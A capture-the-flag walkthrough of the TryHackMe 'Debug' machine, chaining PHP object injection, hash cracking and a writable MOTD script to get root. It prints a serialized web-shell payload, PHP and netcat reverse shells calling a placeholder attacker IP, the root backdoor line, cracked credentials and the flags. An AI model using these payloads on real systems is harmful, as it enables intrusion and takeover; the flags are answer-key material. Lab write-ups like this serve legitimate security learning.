# Debug - TryHackMe Writeup

## Overview

Today we are going to solve another **Linux-based TryHackMe** machine named **Debug**.

The objective is to enumerate the exposed services, identify vulnerable web functionality, obtain an initial foothold through a PHP Object Injection vulnerability, recover user credentials, and finally escalate our privileges to obtain full control of the target system.

---

# Target Information

**Machine IP**

```text
10.49.129.250
```

---

# Reconnaissance

As always, we begin by performing a TCP port scan to identify the exposed services.

```bash
nmap -p- 10.49.129.250
```

The scan reveals two open ports.

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Since only SSH and HTTP are available, the web server becomes our primary attack surface.

To gather additional information, we perform service version detection together with the default NSE scripts.

```bash
nmap -sC -sV 10.49.129.250
```

Output:

```text
22/tcp open ssh
OpenSSH 7.2p2 Ubuntu 4ubuntu2.10

80/tcp open http
Apache httpd 2.4.18 (Ubuntu)
```

Important observations:

* Apache 2.4.18
* Ubuntu Linux
* Default Apache landing page
* No additional virtual hosts discovered initially

The homepage itself contains only the default Apache "It works!" page, so manual browsing provides very little useful information.

---

# Web Enumeration

Since the website does not expose any interesting functionality, we move to directory and file enumeration.

Instead of Gobuster, **Feroxbuster** is used because it performs recursive scanning and discovers backup files efficiently.

```bash
feroxbuster -u http://10.49.129.250
```

After several minutes the scan reveals multiple interesting files.

```text
/backup/
/backup/index.php.bak
/backup/index.html.bak
/backup/style.css
/backup/javascripts/default.js
/grid/base-grid.psd
```

The most valuable discovery is:

```text
/backup/index.php.bak
```

Backup files often contain source code that is no longer accessible through the web server.

---

# Reviewing the Backup Source Code

Opening **index.php.bak** reveals a section clearly intended only for debugging purposes.

```php
$debug = $_GET['debug'] ?? '';

$messageDebug = unserialize($debug);

$application = new FormSubmit;

$application->SaveMessage();
```

This immediately stands out because the application directly passes user-controlled input into:

```php
unserialize()
```

without performing any validation.

This is a classic **PHP Object Injection** vulnerability.

---

# Understanding the Vulnerability

PHP serialization allows objects to be converted into strings.

When those strings are passed to `unserialize()`, PHP recreates the object together with all of its properties.

If a class performs dangerous actions after deserialization, an attacker can manipulate object properties to execute unintended behavior.

In this application, the vulnerable class is:

```php
FormSubmit
```

The object contains two controllable properties:

```php
$form_file

$message
```

The application later saves the message into the specified file.

Because both values are user controlled, we can instruct the application to create an arbitrary PHP file containing attacker-controlled code.

This effectively becomes Remote Code Execution.

---

# Creating the Malicious Object

To exploit the vulnerability, a small PHP script is created that serializes a malicious `FormSubmit` object.

```php
<?php

class FormSubmit {

public $form_file = "message.php";

public $message = "<?php system(\$_GET['cmd']); ?>";

}

$application = new FormSubmit;

echo serialize($application);

?>
```

Running the script:

```bash
php code.php
```

produces the serialized payload.

```text
O:10:"FormSubmit":2:{
s:9:"form_file";
s:11:"message.php";

s:7:"message";
s:30:"<?php system($_GET["cmd"]); ?>"
}
```

The serialized string is then URL encoded before being supplied to the vulnerable **debug** parameter.

Once processed by the application, a new file is written:

```text
message.php
```

inside the web root.

---

# Verifying Remote Code Execution

The newly created PHP web shell is accessed directly.

```bash
curl http://10.49.129.250/message.php?cmd=id
```

Response:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

This confirms arbitrary command execution.

At this point we have reliable Remote Code Execution on the target.

---

# Obtaining a Reverse Shell

While command execution through the browser is useful, an interactive shell makes post-exploitation significantly easier.

Start a Netcat listener.

```bash
rlwrap nc -lvnp 1234
```

Instead of using `system()` repeatedly, a PHP one-liner reverse shell is executed through the web shell.

```bash
curl "http://10.49.129.250/message.php?cmd=php%20-r%20'\$sock=fsockopen(\"<ATTACKER-IP>\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'"
```

Within seconds the reverse connection is received.

```text
connect to [ATTACKER-IP]
from
10.49.129.250
```

Checking privileges:

```bash
id
```

Output:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

The initial foothold has been established as **www-data**.

---

# Shell Stabilization

To obtain a proper interactive terminal, the shell is upgraded using Python.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Background the shell.

```text
CTRL + Z
```

Fix the terminal.

```bash
stty raw -echo

fg
```

Finally:

```bash
export TERM=xterm
```

The reverse shell is now fully interactive.

---

# Local Enumeration

After stabilizing the shell, local enumeration begins.

Exploring the web root reveals two hidden files.

```bash
cat .htpasswd
```

Output:

```text
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

This is an Apache **MD5Crypt** password hash.

Recovering the plaintext password becomes our next objective.

---

# Cracking the Password

Save the hash into a file.

```bash
nano hash
```

Then crack it using John the Ripper.

```bash
john \
--wordlist=/usr/share/wordlists/rockyou.txt \
hash
```

Output:

```text
jamaica
(james)
```

The recovered password is:

```text
jamaica
```

---

# SSH Access

Using the recovered credentials, SSH access is attempted.

```bash
ssh james@10.49.129.250
```

Password:

```text
jamaica
```

Authentication succeeds.

Checking our identity:

```bash
whoami
```

Output:

```text
james
```

We now have a stable user shell through SSH.

---

# User Flag

Reading the user flag.

```bash
cat ~/user.txt
```

Output:

```text
7e37c84a66cc40b1c6bf700d08d28c20
```

At this stage we have successfully:

* Enumerated the web server.
* Discovered backup source code.
* Identified a PHP Object Injection vulnerability.
* Crafted a malicious serialized object.
* Achieved Remote Code Execution.
* Uploaded a persistent PHP web shell.
* Obtained a reverse shell as **www-data**.
* Stabilized the shell.
* Discovered an Apache password hash.
* Cracked the password using John the Ripper.
* Logged in via SSH as **james**.
* Retrieved the user flag.

The next step is to perform local enumeration for privilege escalation and obtain root access.


# Privilege Escalation

After successfully obtaining access as the **james** user and retrieving the user flag, the next objective is to identify a privilege escalation path to root.

As always, the first step is checking sudo permissions.

```bash id="q8n7s1"
sudo -l
```

Unfortunately, James does not have permission to execute commands using `sudo`.

Since the standard sudo route is unavailable, we continue with manual local enumeration.

---

# Local Enumeration

While inspecting James' home directory, an interesting note is discovered.

```bash id="s4k8v2"
cat Note-To-James.txt
```

Contents:

```text id="p9e2d4"
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform!

Could you please make our ssh welcome message a bit more pretty...

I gave you access to modify all these files :)

Best Regards,

root
```

This message immediately suggests that James has write permissions over the SSH welcome message configuration.

The SSH welcome banner is generated using Ubuntu's **Message of the Day (MOTD)** scripts.

These scripts are executed automatically every time a user logs in through SSH.

If one of these scripts is writable by James, it may be possible to execute arbitrary commands as **root** when the SSH daemon generates the login banner.

---

# Inspecting the MOTD Scripts

Ubuntu stores dynamic MOTD scripts inside:

```text id="n5w4m8"
/etc/update-motd.d/
```

Inspecting the default header script:

```bash id="h7x6c3"
cat /etc/update-motd.d/00-header
```

The file ends with:

```bash id="b2g5t9"
printf "Welcome to %s (%s %s %s)\n" \
"$DISTRIB_DESCRIPTION" \
"$(uname -o)" \
"$(uname -r)" \
"$(uname -m)"
```

Because James has permission to modify this script, any commands appended to the file will be executed automatically by root whenever a new SSH session is created.

This is the privilege escalation vector.

---

# Preparing the Reverse Shell

Start a Netcat listener on the attacker machine.

```bash id="m1f9a7"
nc -lvnp 5555
```

A FIFO-based reverse shell payload is prepared.

```bash id="k3d8w5"
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 5555 > /tmp/f
```

This payload creates a named pipe and redirects an interactive shell through Netcat back to the attacker's listener.

---

# Modifying the MOTD Script

Append the reverse shell payload to the end of the MOTD script.

```bash id="v8r6n2"
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> 5555 >/tmp/f' >> /etc/update-motd.d/00-header
```

The modified script now performs its normal function of displaying the login banner while also executing our reverse shell payload.

Because the script is executed by **root**, the reverse shell will inherit root privileges.

---

# Triggering the Exploit

After modifying the MOTD script, simply initiate another SSH login as James.

```bash id="j6p3w1"
ssh james@10.49.129.250
```

As soon as the SSH session starts, the MOTD scripts execute automatically.

Within seconds, the Netcat listener receives a new connection.

```text id="t2s8x4"
connect to [ATTACKER-IP]
```

Checking our privileges:

```bash id="f9u2b6"
id
```

Output:

```text id="g7k1r9"
uid=0(root)
gid=0(root)
groups=0(root)
```

The privilege escalation is successful.

We now have a root shell.

---

# Root Flag

Listing the root directory:

```bash id="y4m6n8"
ls
```

Output:

```text id="r3v8c5"
root.txt
```

Reading the final flag:

```bash id="u5x7d1"
cat /root/root.txt
```

Output:

```text id="q8z2k4"
3c8c3d0fe758c320d158e32f68fabf4b
```

Machine complete.

---

# Complete Attack Chain

```text id="w9n3e6"
Nmap Scan
      │
      ▼
Apache Default Page
      │
      ▼
Feroxbuster Enumeration
      │
      ▼
Backup Source Code Discovery
      │
      ▼
PHP Object Injection
      │
      ▼
Craft Malicious Serialized Object
      │
      ▼
Write PHP Web Shell
      │
      ▼
Remote Code Execution
      │
      ▼
Reverse Shell (www-data)
      │
      ▼
Shell Stabilization
      │
      ▼
Recover Apache Password Hash
      │
      ▼
John the Ripper
      │
      ▼
Recover James Password
      │
      ▼
SSH Login
      │
      ▼
User Flag
      │
      ▼
Writable MOTD Script
      │
      ▼
Append Reverse Shell
      │
      ▼
SSH Login Trigger
      │
      ▼
Root Reverse Shell
      │
      ▼
Read root.txt
```

---

# Vulnerabilities Identified

During the assessment, multiple weaknesses were chained together to achieve full system compromise.

* Backup PHP source code exposed through the web server.
* Unsafe use of `unserialize()` leading to PHP Object Injection.
* Arbitrary file write resulting in Remote Code Execution.
* Apache password hash exposed in `.htpasswd`.
* Weak password successfully cracked using a dictionary attack.
* Writable MOTD script executed with root privileges.
* Insecure SSH login banner configuration allowing arbitrary command execution.

---

# MITRE ATT&CK Mapping

| Technique                               | ID        |
| --------------------------------------- | --------- |
| Exploit Public-Facing Application       | T1190     |
| Command and Scripting Interpreter (PHP) | T1059.006 |
| Command Shell                           | T1059.004 |
| Server Software Component               | T1505     |
| Valid Accounts                          | T1078     |
| Credentials from Password Stores        | T1555     |
| Password Cracking                       | T1110.002 |
| Abuse Elevation Control Mechanism       | T1548     |

---

# Tools Used

* Nmap
* Feroxbuster
* Burp Suite
* PHP
* cURL
* Netcat
* Python
* John the Ripper
* OpenSSH

---

# Lessons Learned

This machine demonstrates how multiple seemingly minor weaknesses can be chained into a complete compromise.

The attack began with directory enumeration, which exposed backup copies of the application's source code. Reviewing the backup revealed an unsafe call to `unserialize()`, leading to a PHP Object Injection vulnerability. By crafting a malicious serialized object, it was possible to write an arbitrary PHP file to the web root and achieve Remote Code Execution.

After obtaining a shell as **www-data**, local enumeration uncovered an Apache `.htpasswd` file containing an MD5Crypt password hash. Because the password was weak, it was successfully recovered using a dictionary attack, allowing SSH access as the **james** user.

The final privilege escalation relied on a writable **MOTD** script. Since these scripts execute automatically as root during SSH login, appending a reverse shell payload resulted in arbitrary command execution with root privileges when the next login occurred.

This challenge highlights the importance of removing backup files from production servers, avoiding insecure deserialization, enforcing strong password policies, protecting authentication files, and restricting write access to privileged system scripts.

---

# Flags

## User Flag

```text id="x4r9m2"
7e37c84a66cc40b1c6bf700d08d28c20
```

## Root Flag

```text id="b6t1q8"
3c8c3d0fe758c320d158e32f68fabf4b
```

---

# Conclusion

The **Debug** machine showcases a realistic attack chain beginning with exposed backup files and ending in full system compromise. By leveraging a PHP Object Injection vulnerability, an attacker can gain Remote Code Execution without authentication. Poor credential management then allows lateral movement through password cracking, while an improperly secured MOTD configuration provides a straightforward path to root.

This challenge reinforces several key security practices: never expose backup files in production, avoid insecure deserialization, enforce strong password policies, protect authentication artifacts such as `.htpasswd`, and ensure that privileged scripts cannot be modified by unprivileged users. Together, these controls significantly reduce the risk of attackers chaining multiple weaknesses into a complete compromise.

---

**Machine Status:** Complete ✅
